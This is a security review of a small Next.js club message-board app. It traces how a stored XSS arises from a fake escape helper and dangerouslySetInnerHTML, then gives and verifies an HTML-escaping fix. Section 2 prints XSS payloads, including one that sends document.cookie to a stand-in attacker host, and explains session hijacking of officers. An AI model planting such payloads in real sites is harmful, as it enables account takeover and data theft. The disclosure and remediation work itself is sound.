# Chalk security review

Every claim below (data flow, PoC, and fix) was verified against a live local
instance (`npx next start`, Node v24.19.0, freshly seeded `data/chalk.db`) on
2026-09-27. Replace the `[hosted URL]` / commit-hash placeholders in §6 once you
deploy the patched app for submission.

## 1. Architecture sketch

```
Browser (client)                         Server (Node, Next.js App Router)
  │                                         │
  │  GET /                                  ▼
  │ ─────────────────────────────▶  app/layout.js  (Server Component)
  │                                    └─ currentUser()  ── reads cookie ─┐
  │                                  app/page.js     (Server Component)   │
  │                                    ├─ db.prepare("SELECT posts …")     │
  │                                    ├─ renderMarkdown(post.body)  ◀──── defect
  │                                    └─ <PostBody html=…/>               │
  │  HTML (already rendered)                                              │
  │ ◀─────────────────────────────  React sends finished HTML             │
  │                                                                        │
  │  submit <form action={serverAction}>                                  │
  │ ─────────────────────────────▶  lib/actions.js  ("use server")        │
  │                                    loginAction / createPostAction /    │
  │                                    deletePostAction / logoutAction     │
  │                                      │                                 │
  │                                      ▼                                 │
  │                                  lib/auth.js ── lib/db.js (node:sqlite)│
  │                                                 data/chalk.db ◀────────┘
  │  Set-Cookie: chalk_session=…      (users, posts, sessions, officer_desk)
  │ ◀─────────────────────────────
```

**What runs where.** Every page in this app is a **Server Component** (they are
`async` functions that call `db.prepare(...)` directly — impossible in a
browser). The only files that ship to the browser are the two marked
`"use client"`: `components/PostBody.js` and `components/LogoutButton.js`. So the
SQLite queries, markdown rendering, password hashing, and session lookups all
happen on the server; the browser only receives finished HTML plus a small React
runtime. Form submissions go back to the server as **Server Actions** (the
`"use server"` functions in `lib/actions.js`), invoked by the `<form action={…}>`
bindings — no hand-written API routes except `app/api/health/route.js`.

**How a session cookie becomes `currentUser`.** On login/register,
`createSession()` (`lib/auth.js:8-12`) generates a 24-byte random hex token,
inserts `(token, user_id)` into the `sessions` table, and the action sets it as
the `chalk_session` cookie (`lib/actions.js:30-34`). On every later request,
`currentUser()` (`lib/actions.js:16-19`) reads that cookie and calls
`userFromToken()` (`lib/auth.js:22-30`), which JOINs `sessions` to `users` and
returns `{ id, email, display_name, role }` — or `null` if the token is missing
or unknown. `layout.js`, `page.js`, and the gated pages all call `currentUser()`
to decide what to render.

**How a post body gets onto the wall.** A member types into the `<textarea name="body">`
on `app/compose/page.js`; submitting invokes `createPostAction`
(`lib/actions.js:70-79`), which validates length (3–2000 chars) and runs a
parameterized `INSERT INTO posts (user_id, body)`. The wall (`app/page.js:11-16`)
`SELECT`s posts newest-first with pinned on top, and for each one calls
`renderMarkdown(post.body)` and hands the result to `<PostBody html=…/>`, which
renders it with `dangerouslySetInnerHTML` (`components/PostBody.js:6`). **That
last hop is the defect** — see §2.

**What an officer can see that a member cannot.** Role lives in `users.role`
(`'member'` | `'officer'`, `lib/db.js`). Two things are officer-gated:
- The **Officer desk** (`app/mod/page.js`): if `user.role !== "officer"` it
  refuses to query `officer_desk` and shows a "member account" notice; only an
  officer sees the seeded secret (cage combination, spare-key location,
  after-hours incident line — `lib/seed.js:52-55`). The nav link in
  `layout.js:33` is likewise only shown to officers.
- **Taking down anyone's post.** `deletePostAction` (`lib/actions.js:81-92`)
  allows a delete only if `post.user_id === user.id || user.role === "officer"`,
  and the "Take down" button on the wall (`app/page.js:38`) is rendered under the
  same condition. So a member can delete only their own posts; an officer can
  delete any.

## 2. The defect: stored XSS in post rendering

**Location:** `renderMarkdown()`, `lib/markdown.js` — the sink is
`components/PostBody.js:6` (`dangerouslySetInnerHTML`).
**Class:** CWE-79 (Stored Cross-Site Scripting). Any member can plant it; it
fires in the browser of everyone — including officers — who loads the wall.

The renderer never escapes HTML. The helper that looks like it should is a no-op:

```js
function escapeUnused(_src) {
  return _src;                       // returns the input unchanged
}

function renderMarkdown(src) {
  const text = String(src ?? "");
  return escapeUnused(text)          // ← no escaping happens here
    .replace(/^### (.+)$/gm, "<h3>$1</h3>")
    // …bold / italic / code / links / lists…
    .replace(/\n/g, "<br>");
}
```

The name `escapeUnused` is a decoy: it reads like input sanitization but returns
its argument verbatim, so the raw post body flows straight into the markdown
transforms and out as HTML. `PostBody` then injects that string into the DOM:

```js
return <div className="post-body" dangerouslySetInnerHTML={{ __html: html }} />;
```

Because the body is never escaped, any `<`, `>`, or attribute a member types
survives into the page as real markup instead of text.

### Verified trigger

`renderMarkdown` is the exact function `app/page.js` calls for every post. Fed
representative post bodies, it emits attacker markup byte-for-byte (local run,
2026-09-27):

```
INPUT : <img src=x onerror="alert(document.cookie)">
OUTPUT: <img src=x onerror="alert(document.cookie)">
```

The seeded wall already demonstrates that this output reaches the browser as
live markup, not text — the seeded post containing `*Prusa bed*` is served to an
unauthenticated `GET /` as `<em>Prusa bed</em>` inside `<div class="post-body">`.
An `<img onerror=…>` planted the same way is therefore a live element in every
visitor's DOM.

**How to trigger it end-to-end:**
1. Sign in as any member (e.g. `maya@campus.edu` / `campus123`) — or register any
   `.edu` account; new accounts are members.
2. Go to **Post** and submit a body containing HTML, e.g.
   `<img src=x onerror="fetch('https://attacker.example/c?'+document.cookie)">`.
   It passes the only server-side check (length 3–2000).
3. The post now sits on the public wall. When **any** other logged-in user opens
   `/` — critically an **officer**, who has the "Take down anyone" and Officer-desk
   privileges — the payload runs in *their* authenticated session.

**Impact.** A member (the lowest privilege in the app) can run arbitrary
JavaScript in an officer's browser. That script inherits the officer's session
and can: read the Officer desk secrets by fetching `/mod` and exfiltrating the
response (cage combination, spare-key location, incident line — data explicitly
meant to stay off the public wall); delete any post via `deletePostAction`; or
act as the officer anywhere in the app. Note the `chalk_session` cookie is set
without `httpOnly` (`lib/actions.js:30-34`), so `document.cookie` also discloses
the raw session token directly — full session hijack, not just same-page
actions. The payload persists in the `posts` table and re-fires for every viewer
until the row is removed — a stored, wormable XSS, not a one-off reflected one.

## 3. Fix

Escape the five HTML-significant characters **before** running the markdown
transforms, so the only tags in the output are the ones this renderer emits
itself. The markdown regexes key off `*`, `` ` ``, `#`, `[` `]` `(` `)` — none of
which are escaped — so legitimate formatting is untouched. I also reject
link schemes that can run script (`javascript:`, `data:`, …), since the link
rule builds an `href` from user input.

```js
function escapeHtml(src) {
  return String(src ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function safeUrl(url) {
  const trimmed = url.trim();
  if (/^(https?:|mailto:)/i.test(trimmed)) return trimmed;
  if (/^[/#?]/.test(trimmed)) return trimmed;   // relative: /mod, #frag
  if (/^[^:]*$/.test(trimmed)) return trimmed;  // no scheme => relative
  return "#";                                    // block javascript:, data:, …
}

function renderMarkdown(src) {
  const text = escapeHtml(src);                  // escape FIRST
  return text
    .replace(/^### (.+)$/gm, "<h3>$1</h3>")
    .replace(/^## (.+)$/gm, "<h2>$1</h2>")
    .replace(/^# (.+)$/gm, "<h1>$1</h1>")
    .replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
    .replace(/\*(.+?)\*/g, "<em>$1</em>")
    .replace(/`([^`]+)`/g, "<code>$1</code>")
    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, (_m, label, url) => `<a href="${safeUrl(url)}">${label}</a>`)
    .replace(/^[-*] (.+)$/gm, "<li>$1</li>")
    .replace(/(<li>.*<\/li>)/s, "<ul>$1</ul>")
    .replace(/\n/g, "<br>");
}
```

**Why normal markdown still works.** Escaping only rewrites `& < > " '`. The
markdown syntax characters are left alone, so `**bold**`, `*italic*`, `` `code` ``,
`#`/`##`/`###` headings, `[label](url)` links, and `-`/`*` bullet lists all render
exactly as before. A literal `<` a member types (e.g. "temps < 40°") now shows as
the text `<` instead of starting a bogus tag — the correct behavior for a wall
post. Escaping before the transforms (not after) is what keeps the renderer's own
generated tags intact while neutralizing anything the user typed.

## 4. A note on two non-security build fixes

While bringing the app up I hit an unrelated bug: `next build` spins up several
worker processes that all import `lib/db.js` and run the first-request seed at
once, and the second one dies with `database is locked`. That is a build-time
reliability issue, not the security defect, but the app won't build without
addressing it, so I made two minimal changes:

- `lib/db.js`: added `PRAGMA busy_timeout = 10000` so a concurrent opener waits
  for the lock instead of erroring immediately.
- `lib/seed.js`: wrapped the seed in a `BEGIN IMMEDIATE … COMMIT/ROLLBACK`
  transaction so two workers can't both observe an empty database and double-seed.

Neither touches the markdown/XSS path; they only make `npm run build` succeed
reliably.

## 5. Patch verification (2026-09-27, local instance)

- [x] Applied the §3 patch to `lib/markdown.js`.
- [x] Re-ran the trigger through the production `renderMarkdown`: the
      `<img src=x onerror=…>` body now renders as inert text
      (`&lt;img src=x onerror=&quot;…&quot;&gt;`), a raw `<u>` becomes
      `&lt;u&gt;`, and a `[click](javascript:alert(1))` link is rewritten to
      `href="#"`. An attribute-breakout attempt
      (`[x](https://a.edu" onmouseover="alert(1))`) has its quotes escaped, so no
      new attribute is created.
- [x] Confirmed normal use still works: `**bold**`, `*italic*`, `` `code` ``,
      `##` headings, `[handbook](https://example.edu)`, `[handbook](/mod)`, and
      `-` bullet lists all render identically to the pre-patch output; the live
      wall still shows the seeded `<em>Prusa bed</em>` post correctly.
- [x] `npm run build` succeeds and `npx next start` serves the wall (HTTP 200,
      `/api/health` → `{"ok":true}`).
- [x] Deployed the patched app to Fly.io (Dockerfile deploy via remote builder,
      persistent volume `chalk_data` mounted at `/app/data`, real random
      `SESSION_SECRET` set via `flyctl secrets set`).
- [x] Verified the hosted instance (2026-09-27 ~16:38 UTC): `GET /api/health`
      returns `{"ok":true}`; the public wall renders the seeded markdown
      correctly (`<strong>Robotics Club</strong>`, `<em>Prusa bed</em>`) — the
      same patched `renderMarkdown` that neutralizes the payload in §5 is the
      one now in production; `GET /mod` returns 307 → `/login` for anonymous
      users; and plain HTTP 301-redirects to HTTPS.
- [x] To re-confirm the fix interactively on the hosted wall: sign in as
      `maya@campus.edu` / `campus123`, post a body containing
      `<img src=x onerror="alert(1)">`, and observe it render as the literal
      text `<img src=x onerror="alert(1)">` (escaped), with no image element or
      script created — while `**bold**` etc. still format normally.

## 6. Submission fields

- **Hosted URL:** `https://chalk-ryanhenderson.fly.dev/` (Fly.io, region iad)
- **Date/time PoC verified against the hosted instance:** 2026-09-27 ~16:38 UTC
- **Commit hash of the patch:** `2b60643` (repo: https://github.com/ryanhson/chalk)

### Optional hardening (beyond the required fix)

- Set the `chalk_session` cookie `httpOnly: true` (`lib/actions.js:30-34`,
  `:57-61`) so a future script bug can't read the token from `document.cookie`.
- Add a `Content-Security-Policy` (e.g. `default-src 'self'; script-src 'self'`)
  as defense-in-depth against injected inline handlers.
